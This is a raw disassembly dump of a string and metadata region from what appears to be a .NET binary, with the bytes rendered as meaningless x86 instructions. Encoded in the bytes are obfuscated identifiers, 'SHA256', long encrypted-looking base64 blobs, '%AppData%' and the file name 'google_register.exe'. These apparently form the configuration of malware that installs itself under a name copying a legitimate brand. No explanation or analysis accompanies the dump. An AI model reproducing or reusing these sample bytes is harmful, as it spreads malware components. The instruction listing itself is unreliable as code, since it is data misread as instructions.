  409e7a:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e81:	49 
  409e82:	6e                   	outsb  %ds:(%esi),(%dx)
  409e83:	65 71 75             	gs jno 0x409efb
  409e86:	61                   	popa
  409e87:	6c                   	insb   (%dx),%es:(%edi)
  409e88:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409e8f:	74 
  409e90:	65 6d                	gs insl (%dx),%es:(%edi)
  409e92:	2e 4e                	cs dec %esi
  409e94:	65 74 2e             	gs je  0x409ec5
  409e97:	53                   	push   %ebx
  409e98:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e9c:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ea3:	64 
  409ea4:	6f                   	outsl  %ds:(%esi),(%dx)
  409ea5:	77 73                	ja     0x409f1a
  409ea7:	49                   	dec    %ecx
  409ea8:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409eab:	74 69                	je     0x409f16
  409ead:	74 79                	je     0x409f28
  409eaf:	00 49 73             	add    %cl,0x73(%ecx)
  409eb2:	4e                   	dec    %esi
  409eb3:	75 6c                	jne    0x409f21
  409eb5:	6c                   	insb   (%dx),%es:(%edi)
  409eb6:	4f                   	dec    %edi
  409eb7:	72 45                	jb     0x409efe
  409eb9:	6d                   	insl   (%dx),%es:(%edi)
  409eba:	70 74                	jo     0x409f30
  409ebc:	79 00                	jns    0x409ebe
  409ebe:	67 79 6e             	addr16 jns 0x409f2f
  409ec1:	65 5a                	gs pop %edx
  409ec3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ec4:	51                   	push   %ecx
  409ec5:	68 68 79 64 44       	push   $0x44647968
  409eca:	7a 00                	jp     0x409ecc
  409ecc:	53                   	push   %ebx
  409ecd:	49                   	dec    %ecx
  409ece:	50                   	push   %eax
  409ecf:	5a                   	pop    %edx
  409ed0:	6c                   	insb   (%dx),%es:(%edi)
  409ed1:	73 7a                	jae    0x409f4d
  409ed3:	49                   	dec    %ecx
  409ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed5:	65 51                	gs push %ecx
  409ed7:	4f                   	dec    %edi
  409ed8:	4d                   	dec    %ebp
  409ed9:	7a 00                	jp     0x409edb
  409edb:	48                   	dec    %eax
  409edc:	68 45 43 4f 59       	push   $0x594f4345
  409ee1:	7a 6f                	jp     0x409f52
  409ee3:	67 72 54             	addr16 jb 0x409f3a
  409ee6:	50                   	push   %eax
  409ee7:	7a 00                	jp     0x409ee9
  409ee9:	72 54                	jb     0x409f3f
  409eeb:	57                   	push   %edi
  409eec:	43                   	inc    %ebx
  409eed:	59                   	pop    %ecx
  409eee:	6e                   	outsb  %ds:(%esi),(%dx)
  409eef:	74 67                	je     0x409f58
  409ef1:	4b                   	dec    %ebx
  409ef2:	4b                   	dec    %ebx
  409ef3:	54                   	push   %esp
  409ef4:	7a 00                	jp     0x409ef6
  409ef6:	78 7a                	js     0x409f72
  409ef8:	61                   	popa
  409ef9:	54                   	push   %esp
  409efa:	70 77                	jo     0x409f73
  409efc:	59                   	pop    %ecx
  409efd:	66 48                	dec    %ax
  409eff:	59                   	pop    %ecx
  409f00:	50                   	push   %eax
  409f01:	58                   	pop    %eax
  409f02:	7a 00                	jp     0x409f04
  409f04:	62 6c 67 51          	bound  %ebp,0x51(%edi,%eiz,2)
  409f08:	63 4f 66             	arpl   %ecx,0x66(%edi)
  409f0b:	41                   	inc    %ecx
  409f0c:	52                   	push   %edx
  409f0d:	41                   	inc    %ecx
  409f0e:	79 67                	jns    0x409f77
  409f10:	61                   	popa
  409f11:	64 7a 00             	fs jp  0x409f14
  409f14:	6f                   	outsl  %ds:(%esi),(%dx)
  409f15:	76 65                	jbe    0x409f7c
  409f17:	64 58                	fs pop %eax
  409f19:	4e                   	dec    %esi
  409f1a:	75 69                	jne    0x409f85
  409f1c:	53                   	push   %ebx
  409f1d:	65 47                	gs inc %edi
  409f1f:	63 68 7a             	arpl   %ebp,0x7a(%eax)
  409f22:	00 41 77             	add    %al,0x77(%ecx)
  409f25:	79 79                	jns    0x409fa0
  409f27:	48                   	dec    %eax
  409f28:	67 64 68 41 56 7a 4e 	addr16 fs push $0x4e7a5641
  409f2f:	6b 7a 00 4a          	imul   $0x4a,0x0(%edx),%edi
  409f33:	48                   	dec    %eax
  409f34:	75 6d                	jne    0x409fa3
  409f36:	6a 75                	push   $0x75
  409f38:	66 70 69             	data16 jo 0x409fa4
  409f3b:	59                   	pop    %ecx
  409f3c:	6c                   	insb   (%dx),%es:(%edi)
  409f3d:	74 7a                	je     0x409fb9
  409f3f:	00 74 6a 4b          	add    %dh,0x4b(%edx,%ebp,2)
  409f43:	68 67 64 49 6b       	push   $0x6b496467
  409f48:	69 7a 77 7a 00 00 00 	imul   $0x7a,0x77(%edx),%edi
  409f4f:	00 00                	add    %al,(%eax)
  409f51:	0d 53 00 48 00       	or     $0x480053,%eax
  409f56:	41                   	inc    %ecx
  409f57:	00 32                	add    %dh,(%edx)
  409f59:	00 35 00 36 00 00    	add    %dh,0x3600
  409f5f:	81 59 62 00 49 00 30 	sbbl   $0x30004900,0x62(%ecx)
  409f66:	00 62 00             	add    %ah,0x0(%edx)
  409f69:	65 00 44 00 4d       	add    %al,%gs:0x4d(%eax,%eax,1)
  409f6e:	00 59 00             	add    %bl,0x0(%ecx)
  409f71:	4a                   	dec    %edx
  409f72:	00 76 00             	add    %dh,0x0(%esi)
  409f75:	41                   	inc    %ecx
  409f76:	00 35 00 63 00 55    	add    %dh,0x55006300
  409f7c:	00 6e 00             	add    %ch,0x0(%esi)
  409f7f:	4c                   	dec    %esp
  409f80:	00 55 00             	add    %dl,0x0(%ebp)
  409f83:	57                   	push   %edi
  409f84:	00 71 00             	add    %dh,0x0(%ecx)
  409f87:	4c                   	dec    %esp
  409f88:	00 6a 00             	add    %ch,0x0(%edx)
  409f8b:	6d                   	insl   (%dx),%es:(%edi)
  409f8c:	00 66 00             	add    %ah,0x0(%esi)
  409f8f:	67 00 31             	add    %dh,(%bx,%di)
  409f92:	00 51 00             	add    %dl,0x0(%ecx)
  409f95:	6f                   	outsl  %ds:(%esi),(%dx)
  409f96:	00 62 00             	add    %ah,0x0(%edx)
  409f99:	6c                   	insb   (%dx),%es:(%edi)
  409f9a:	00 6b 00             	add    %ch,0x0(%ebx)
  409f9d:	44                   	inc    %esp
  409f9e:	00 33                	add    %dh,(%ebx)
  409fa0:	00 4d 00             	add    %cl,0x0(%ebp)
  409fa3:	4a                   	dec    %edx
  409fa4:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  409fa8:	00 63 00             	add    %ah,0x0(%ebx)
  409fab:	4f                   	dec    %edi
  409fac:	00 32                	add    %dh,(%edx)
  409fae:	00 66 00             	add    %ah,0x0(%esi)
  409fb1:	69 00 52 00 67 00    	imul   $0x670052,(%eax),%eax
  409fb7:	4a                   	dec    %edx
  409fb8:	00 71 00             	add    %dh,0x0(%ecx)
  409fbb:	55                   	push   %ebp
  409fbc:	00 52 00             	add    %dl,0x0(%edx)
  409fbf:	55                   	push   %ebp
  409fc0:	00 62 00             	add    %ah,0x0(%edx)
  409fc3:	72 00                	jb     0x409fc5
  409fc5:	34 00                	xor    $0x0,%al
  409fc7:	4b                   	dec    %ebx
  409fc8:	00 6b 00             	add    %ch,0x0(%ebx)
  409fcb:	76 00                	jbe    0x409fcd
  409fcd:	4f                   	dec    %edi
  409fce:	00 39                	add    %bh,(%ecx)
  409fd0:	00 6d 00             	add    %ch,0x0(%ebp)
  409fd3:	37                   	aaa
  409fd4:	00 35 00 38 00 46    	add    %dh,0x46003800
  409fda:	00 58 00             	add    %bl,0x0(%eax)
  409fdd:	31 00                	xor    %eax,(%eax)
  409fdf:	55                   	push   %ebp
  409fe0:	00 66 00             	add    %ah,0x0(%esi)
  409fe3:	31 00                	xor    %eax,(%eax)
  409fe5:	73 00                	jae    0x409fe7
  409fe7:	68 00 57 00 30       	push   $0x30005700
  409fec:	00 79 00             	add    %bh,0x0(%ecx)
  409fef:	72 00                	jb     0x409ff1
  409ff1:	58                   	pop    %eax
  409ff2:	00 63 00             	add    %ah,0x0(%ebx)
  409ff5:	59                   	pop    %ecx
  409ff6:	00 59 00             	add    %bl,0x0(%ecx)
  409ff9:	6d                   	insl   (%dx),%es:(%edi)
  409ffa:	00 6e 00             	add    %ch,0x0(%esi)
  409ffd:	48                   	dec    %eax
  409ffe:	00 70 00             	add    %dh,0x0(%eax)
  40a001:	58                   	pop    %eax
  40a002:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a005:	31 00                	xor    %eax,(%eax)
  40a007:	6f                   	outsl  %ds:(%esi),(%dx)
  40a008:	00 33                	add    %dh,(%ebx)
  40a00a:	00 75 00             	add    %dh,0x0(%ebp)
  40a00d:	50                   	push   %eax
  40a00e:	00 50 00             	add    %dl,0x0(%eax)
  40a011:	41                   	inc    %ecx
  40a012:	00 63 00             	add    %ah,0x0(%ebx)
  40a015:	72 00                	jb     0x40a017
  40a017:	32 00                	xor    (%eax),%al
  40a019:	37                   	aaa
  40a01a:	00 5a 00             	add    %bl,0x0(%edx)
  40a01d:	76 00                	jbe    0x40a01f
  40a01f:	31 00                	xor    %eax,(%eax)
  40a021:	31 00                	xor    %eax,(%eax)
  40a023:	68 00 75 00 42       	push   $0x42007500
  40a028:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a02c:	00 6a 00             	add    %ch,0x0(%edx)
  40a02f:	37                   	aaa
  40a030:	00 47 00             	add    %al,0x0(%edi)
  40a033:	6c                   	insb   (%dx),%es:(%edi)
  40a034:	00 6d 00             	add    %ch,0x0(%ebp)
  40a037:	41                   	inc    %ecx
  40a038:	00 31                	add    %dh,(%ecx)
  40a03a:	00 67 00             	add    %ah,0x0(%edi)
  40a03d:	65 00 2f             	add    %ch,%gs:(%edi)
  40a040:	00 66 00             	add    %ah,0x0(%esi)
  40a043:	49                   	dec    %ecx
  40a044:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40a048:	00 48 00             	add    %cl,0x0(%eax)
  40a04b:	41                   	inc    %ecx
  40a04c:	00 48 00             	add    %cl,0x0(%eax)
  40a04f:	55                   	push   %ebp
  40a050:	00 63 00             	add    %ah,0x0(%ebx)
  40a053:	79 00                	jns    0x40a055
  40a055:	55                   	push   %ebp
  40a056:	00 5a 00             	add    %bl,0x0(%edx)
  40a059:	79 00                	jns    0x40a05b
  40a05b:	4b                   	dec    %ebx
  40a05c:	00 5a 00             	add    %bl,0x0(%edx)
  40a05f:	53                   	push   %ebx
  40a060:	00 43 00             	add    %al,0x0(%ebx)
  40a063:	37                   	aaa
  40a064:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  40a068:	00 51 00             	add    %dl,0x0(%ecx)
  40a06b:	42                   	inc    %edx
  40a06c:	00 65 00             	add    %ah,0x0(%ebp)
  40a06f:	6d                   	insl   (%dx),%es:(%edi)
  40a070:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a073:	49                   	dec    %ecx
  40a074:	00 4e 00             	add    %cl,0x0(%esi)
  40a077:	69 00 48 00 4e 00    	imul   $0x4e0048,(%eax),%eax
  40a07d:	6a 00                	push   $0x0
  40a07f:	74 00                	je     0x40a081
  40a081:	6a 00                	push   $0x0
  40a083:	46                   	inc    %esi
  40a084:	00 49 00             	add    %cl,0x0(%ecx)
  40a087:	4e                   	dec    %esi
  40a088:	00 31                	add    %dh,(%ecx)
  40a08a:	00 49 00             	add    %cl,0x0(%ecx)
  40a08d:	73 00                	jae    0x40a08f
  40a08f:	79 00                	jns    0x40a091
  40a091:	52                   	push   %edx
  40a092:	00 6e 00             	add    %ch,0x0(%esi)
  40a095:	48                   	dec    %eax
  40a096:	00 78 00             	add    %bh,0x0(%eax)
  40a099:	46                   	inc    %esi
  40a09a:	00 52 00             	add    %dl,0x0(%edx)
  40a09d:	73 00                	jae    0x40a09f
  40a09f:	69 00 70 00 39 00    	imul   $0x390070,(%eax),%eax
  40a0a5:	76 00                	jbe    0x40a0a7
  40a0a7:	33 00                	xor    (%eax),%eax
  40a0a9:	43                   	inc    %ebx
  40a0aa:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0ad:	46                   	inc    %esi
  40a0ae:	00 47 00             	add    %al,0x0(%edi)
  40a0b1:	61                   	popa
  40a0b2:	00 62 00             	add    %ah,0x0(%edx)
  40a0b5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0b6:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a0bc:	32 00                	xor    (%eax),%al
  40a0be:	72 00                	jb     0x40a0c0
  40a0c0:	4e                   	dec    %esi
  40a0c1:	00 31                	add    %dh,(%ecx)
  40a0c3:	00 36                	add    %dh,(%esi)
  40a0c5:	00 78 00             	add    %bh,0x0(%eax)
  40a0c8:	43                   	inc    %ebx
  40a0c9:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40a0cd:	00 57 00             	add    %dl,0x0(%edi)
  40a0d0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0d1:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40a0d5:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a0d9:	00 33                	add    %dh,(%ebx)
  40a0db:	00 6e 00             	add    %ch,0x0(%esi)
  40a0de:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a0e2:	79 00                	jns    0x40a0e4
  40a0e4:	42                   	inc    %edx
  40a0e5:	00 59 00             	add    %bl,0x0(%ecx)
  40a0e8:	35 00 68 00 72       	xor    $0x72006800,%eax
  40a0ed:	00 63 00             	add    %ah,0x0(%ebx)
  40a0f0:	44                   	inc    %esp
  40a0f1:	00 2f                	add    %ch,(%edi)
  40a0f3:	00 2f                	add    %ch,(%edi)
  40a0f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a0f8:	34 00                	xor    $0x0,%al
  40a0fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0fb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0fe:	54                   	push   %esp
  40a0ff:	00 70 00             	add    %dh,0x0(%eax)
  40a102:	39 00                	cmp    %eax,(%eax)
  40a104:	36 00 35 00 62 00 45 	add    %dh,%ss:0x45006200
  40a10b:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a10f:	00 4e 00             	add    %cl,0x0(%esi)
  40a112:	38 00                	cmp    %al,(%eax)
  40a114:	62 00                	bound  %eax,(%eax)
  40a116:	4a                   	dec    %edx
  40a117:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40a11b:	00 48 00             	add    %cl,0x0(%eax)
  40a11e:	37                   	aaa
  40a11f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a122:	74 00                	je     0x40a124
  40a124:	68 00 73 00 37       	push   $0x37007300
  40a129:	00 6a 00             	add    %ch,0x0(%edx)
  40a12c:	57                   	push   %edi
  40a12d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a130:	6f                   	outsl  %ds:(%esi),(%dx)
  40a131:	00 6f 00             	add    %ch,0x0(%edi)
  40a134:	6e                   	outsb  %ds:(%esi),(%dx)
  40a135:	00 42 00             	add    %al,0x0(%edx)
  40a138:	63 00                	arpl   %eax,(%eax)
  40a13a:	47                   	inc    %edi
  40a13b:	00 4f 00             	add    %cl,0x0(%edi)
  40a13e:	47                   	inc    %edi
  40a13f:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a143:	00 49 00             	add    %cl,0x0(%ecx)
  40a146:	79 00                	jns    0x40a148
  40a148:	73 00                	jae    0x40a14a
  40a14a:	41                   	inc    %ecx
  40a14b:	00 70 00             	add    %dh,0x0(%eax)
  40a14e:	49                   	dec    %ecx
  40a14f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a152:	48                   	dec    %eax
  40a153:	00 6d 00             	add    %ch,0x0(%ebp)
  40a156:	6d                   	insl   (%dx),%es:(%edi)
  40a157:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40a15b:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40a15f:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40a163:	00 68 00             	add    %ch,0x0(%eax)
  40a166:	67 00 3d             	add    %bh,(%di)
  40a169:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a16f:	2f                   	das
  40a170:	00 6e 00             	add    %ch,0x0(%esi)
  40a173:	68 00 33 00 58       	push   $0x58003300
  40a178:	00 37                	add    %dh,(%edi)
  40a17a:	00 78 00             	add    %bh,0x0(%eax)
  40a17d:	59                   	pop    %ecx
  40a17e:	00 65 00             	add    %ah,0x0(%ebp)
  40a181:	6d                   	insl   (%dx),%es:(%edi)
  40a182:	00 43 00             	add    %al,0x0(%ebx)
  40a185:	48                   	dec    %eax
  40a186:	00 48 00             	add    %cl,0x0(%eax)
  40a189:	65 00 2f             	add    %ch,%gs:(%edi)
  40a18c:	00 46 00             	add    %al,0x0(%esi)
  40a18f:	4e                   	dec    %esi
  40a190:	00 59 00             	add    %bl,0x0(%ecx)
  40a193:	6c                   	insb   (%dx),%es:(%edi)
  40a194:	00 2b                	add    %ch,(%ebx)
  40a196:	00 51 00             	add    %dl,0x0(%ecx)
  40a199:	6f                   	outsl  %ds:(%esi),(%dx)
  40a19a:	00 50 00             	add    %dl,0x0(%eax)
  40a19d:	34 00                	xor    $0x0,%al
  40a19f:	6d                   	insl   (%dx),%es:(%edi)
  40a1a0:	00 6e 00             	add    %ch,0x0(%esi)
  40a1a3:	63 00                	arpl   %eax,(%eax)
  40a1a5:	58                   	pop    %eax
  40a1a6:	00 7a 00             	add    %bh,0x0(%edx)
  40a1a9:	62 00                	bound  %eax,(%eax)
  40a1ab:	70 00                	jo     0x40a1ad
  40a1ad:	76 00                	jbe    0x40a1af
  40a1af:	42                   	inc    %edx
  40a1b0:	00 78 00             	add    %bh,0x0(%eax)
  40a1b3:	39 00                	cmp    %eax,(%eax)
  40a1b5:	34 00                	xor    $0x0,%al
  40a1b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1b8:	00 39                	add    %bh,(%ecx)
  40a1ba:	00 38                	add    %bh,(%eax)
  40a1bc:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1bf:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40a1c3:	58                   	pop    %eax
  40a1c4:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40a1c8:	00 6a 00             	add    %ch,0x0(%edx)
  40a1cb:	56                   	push   %esi
  40a1cc:	00 71 00             	add    %dh,0x0(%ecx)
  40a1cf:	2f                   	das
  40a1d0:	00 76 00             	add    %dh,0x0(%esi)
  40a1d3:	72 00                	jb     0x40a1d5
  40a1d5:	6a 00                	push   $0x0
  40a1d7:	39 00                	cmp    %eax,(%eax)
  40a1d9:	54                   	push   %esp
  40a1da:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a1de:	00 52 00             	add    %dl,0x0(%edx)
  40a1e1:	4a                   	dec    %edx
  40a1e2:	00 56 00             	add    %dl,0x0(%esi)
  40a1e5:	4a                   	dec    %edx
  40a1e6:	00 62 00             	add    %ah,0x0(%edx)
  40a1e9:	4b                   	dec    %ebx
  40a1ea:	00 49 00             	add    %cl,0x0(%ecx)
  40a1ed:	50                   	push   %eax
  40a1ee:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a1f2:	00 61 00             	add    %ah,0x0(%ecx)
  40a1f5:	39 00                	cmp    %eax,(%eax)
  40a1f7:	46                   	inc    %esi
  40a1f8:	00 71 00             	add    %dh,0x0(%ecx)
  40a1fb:	48                   	dec    %eax
  40a1fc:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a200:	00 56 00             	add    %dl,0x0(%esi)
  40a203:	4b                   	dec    %ebx
  40a204:	00 41 00             	add    %al,0x0(%ecx)
  40a207:	34 00                	xor    $0x0,%al
  40a209:	56                   	push   %esi
  40a20a:	00 67 00             	add    %ah,0x0(%edi)
  40a20d:	31 00                	xor    %eax,(%eax)
  40a20f:	43                   	inc    %ebx
  40a210:	00 31                	add    %dh,(%ecx)
  40a212:	00 7a 00             	add    %bh,0x0(%edx)
  40a215:	45                   	inc    %ebp
  40a216:	00 53 00             	add    %dl,0x0(%ebx)
  40a219:	51                   	push   %ecx
  40a21a:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a220:	80 b1 64 00 66 00 32 	xorb   $0x32,0x660064(%ecx)
  40a227:	00 31                	add    %dh,(%ecx)
  40a229:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40a22d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a230:	78 00                	js     0x40a232
  40a232:	4e                   	dec    %esi
  40a233:	00 35 00 68 00 4d    	add    %dh,0x4d006800
  40a239:	00 36                	add    %dh,(%esi)
  40a23b:	00 36                	add    %dh,(%esi)
  40a23d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40a241:	00 30                	add    %dh,(%eax)
  40a243:	00 4a 00             	add    %cl,0x0(%edx)
  40a246:	75 00                	jne    0x40a248
  40a248:	75 00                	jne    0x40a24a
  40a24a:	79 00                	jns    0x40a24c
  40a24c:	41                   	inc    %ecx
  40a24d:	00 31                	add    %dh,(%ecx)
  40a24f:	00 31                	add    %dh,(%ecx)
  40a251:	00 6e 00             	add    %ch,0x0(%esi)
  40a254:	5a                   	pop    %edx
  40a255:	00 4f 00             	add    %cl,0x0(%edi)
  40a258:	51                   	push   %ecx
  40a259:	00 66 00             	add    %ah,0x0(%esi)
  40a25c:	50                   	push   %eax
  40a25d:	00 76 00             	add    %dh,0x0(%esi)
  40a260:	76 00                	jbe    0x40a262
  40a262:	74 00                	je     0x40a264
  40a264:	57                   	push   %edi
  40a265:	00 51 00             	add    %dl,0x0(%ecx)
  40a268:	31 00                	xor    %eax,(%eax)
  40a26a:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a26e:	42                   	inc    %edx
  40a26f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a272:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40a276:	6d                   	insl   (%dx),%es:(%edi)
  40a277:	00 6d 00             	add    %ch,0x0(%ebp)
  40a27a:	37                   	aaa
  40a27b:	00 43 00             	add    %al,0x0(%ebx)
  40a27e:	41                   	inc    %ecx
  40a27f:	00 53 00             	add    %dl,0x0(%ebx)
  40a282:	4e                   	dec    %esi
  40a283:	00 69 00             	add    %ch,0x0(%ecx)
  40a286:	63 00                	arpl   %eax,(%eax)
  40a288:	72 00                	jb     0x40a28a
  40a28a:	44                   	inc    %esp
  40a28b:	00 46 00             	add    %al,0x0(%esi)
  40a28e:	32 00                	xor    (%eax),%al
  40a290:	44                   	inc    %esp
  40a291:	00 5a 00             	add    %bl,0x0(%edx)
  40a294:	6a 00                	push   $0x0
  40a296:	55                   	push   %ebp
  40a297:	00 4f 00             	add    %cl,0x0(%edi)
  40a29a:	55                   	push   %ebp
  40a29b:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40a29f:	00 33                	add    %dh,(%ebx)
  40a2a1:	00 41 00             	add    %al,0x0(%ecx)
  40a2a4:	34 00                	xor    $0x0,%al
  40a2a6:	39 00                	cmp    %eax,(%eax)
  40a2a8:	62 00                	bound  %eax,(%eax)
  40a2aa:	51                   	push   %ecx
  40a2ab:	00 32                	add    %dh,(%edx)
  40a2ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2b0:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40a2b4:	38 00                	cmp    %al,(%eax)
  40a2b6:	31 00                	xor    %eax,(%eax)
  40a2b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b9:	00 52 00             	add    %dl,0x0(%edx)
  40a2bc:	46                   	inc    %esi
  40a2bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a2c0:	6a 00                	push   $0x0
  40a2c2:	49                   	dec    %ecx
  40a2c3:	00 52 00             	add    %dl,0x0(%edx)
  40a2c6:	78 00                	js     0x40a2c8
  40a2c8:	46                   	inc    %esi
  40a2c9:	00 33                	add    %dh,(%ebx)
  40a2cb:	00 67 00             	add    %ah,0x0(%edi)
  40a2ce:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a2d3:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40a2d9:	00 70 00             	add    %dh,0x0(%eax)
  40a2dc:	44                   	inc    %esp
  40a2dd:	00 61 00             	add    %ah,0x0(%ecx)
  40a2e0:	74 00                	je     0x40a2e2
  40a2e2:	61                   	popa
  40a2e3:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2e9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2ec:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2ed:	00 67 00             	add    %ah,0x0(%edi)
  40a2f0:	6c                   	insb   (%dx),%es:(%edi)
  40a2f1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2f4:	5f                   	pop    %edi
  40a2f5:	00 72 00             	add    %dh,0x0(%edx)
  40a2f8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2fc:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a302:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a306:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a30a:	78 00                	js     0x40a30c
  40a30c:	65 00 00             	add    %al,%gs:(%eax)
  40a30f:	59                   	pop    %ecx
  40a310:	63 00                	arpl   %eax,(%eax)
  40a312:	55                   	push   %ebp
  40a313:	00 46 00             	add    %al,0x0(%esi)
  40a316:	35 00 59 00 6d       	xor    $0x6d005900,%eax
  40a31b:	00 4a 00             	add    %cl,0x0(%edx)
  40a31e:	31 00                	xor    %eax,(%eax)
  40a320:	63 00                	arpl   %eax,(%eax)
  40a322:	30 00                	xor    %al,(%eax)
  40a324:	74 00                	je     0x40a326
  40a326:	32 00                	xor    (%eax),%al
  40a328:	54                   	push   %esp
  40a329:	00 31                	add    %dh,(%ecx)
  40a32b:	00 5a 00             	add    %bl,0x0(%edx)
  40a32e:	55                   	push   %ebp
  40a32f:	00 59 00             	add    %bl,0x0(%ecx)
  40a332:	6d                   	insl   (%dx),%es:(%edi)
  40a333:	00 4a 00             	add    %cl,0x0(%edx)
  40a336:	76 00                	jbe    0x40a338
  40a338:	5a                   	pop    %edx
  40a339:	00 6a 00             	add    %ch,0x0(%edx)
  40a33c:	6c                   	insb   (%dx),%es:(%edi)
  40a33d:	00 4e 00             	add    %cl,0x0(%esi)
  40a340:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40a344:	35 00 6f 00 4e       	xor    $0x4e006f00,%eax
  40a349:	00 55 00             	add    %dl,0x0(%ebp)
  40a34c:	35 00 6a 00 63       	xor    $0x63006a00,%eax
  40a351:	00 47 00             	add    %al,0x0(%edi)
  40a354:	5a                   	pop    %edx
  40a355:	00 49 00             	add    %cl,0x0(%ecx)
  40a358:	4e                   	dec    %esi
  40a359:	00 6e 00             	add    %ch,0x0(%esi)
  40a35c:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a35f:	00 57 00             	add    %dl,0x0(%edi)
  40a362:	6d                   	insl   (%dx),%es:(%edi)
  40a363:	00 77 00             	add    %dh,0x0(%edi)
  40a366:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a36b:	42                   	inc    %edx
  40a36c:	00 4b 00             	add    %cl,0x0(%ebx)
  40a36f:	45                   	inc    %ebp
  40a370:	00 48 00             	add    %cl,0x0(%eax)
  40a373:	73 00                	jae    0x40a375
  40a375:	69 00 77 00 4d 00    	imul   $0x4d0077,(%eax),%eax
  40a37b:	30 00                	xor    %al,(%eax)
  40a37d:	37                   	aaa
  40a37e:	00 6b 00             	add    %ch,0x0(%ebx)
  40a381:	55                   	push   %ebp
  40a382:	00 6f 00             	add    %ch,0x0(%edi)
  40a385:	6d                   	insl   (%dx),%es:(%edi)
  40a386:	00 37                	add    %dh,(%edi)
  40a388:	00 59 00             	add    %bl,0x0(%ecx)
  40a38b:	49                   	dec    %ecx
  40a38c:	00 33                	add    %dh,(%ebx)
  40a38e:	00 4d 00             	add    %cl,0x0(%ebp)
  40a391:	2f                   	das
  40a392:	00 65 00             	add    %ah,0x0(%ebp)
  40a395:	51                   	push   %ecx
  40a396:	00 41 00             	add    %al,0x0(%ecx)
  40a399:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40a39d:	63 00                	arpl   %eax,(%eax)
  40a39f:	73 00                	jae    0x40a3a1
  40a3a1:	54                   	push   %esp
  40a3a2:	00 41 00             	add    %al,0x0(%ecx)
  40a3a5:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a3a9:	62 00                	bound  %eax,(%eax)
  40a3ab:	50                   	push   %eax
  40a3ac:	00 31                	add    %dh,(%ecx)
  40a3ae:	00 6a 00             	add    %ch,0x0(%edx)
  40a3b1:	44                   	inc    %esp
  40a3b2:	00 71 00             	add    %dh,0x0(%ecx)
  40a3b5:	2f                   	das
  40a3b6:	00 4e 00             	add    %cl,0x0(%esi)
  40a3b9:	74 00                	je     0x40a3bb
  40a3bb:	67 00 39             	add    %bh,(%bx,%di)
  40a3be:	00 62 00             	add    %ah,0x0(%edx)
  40a3c1:	74 00                	je     0x40a3c3
  40a3c3:	42                   	inc    %edx
  40a3c4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3c7:	48                   	dec    %eax
  40a3c8:	00 7a 00             	add    %bh,0x0(%edx)
  40a3cb:	69 00 53 00 58 00    	imul   $0x580053,(%eax),%eax
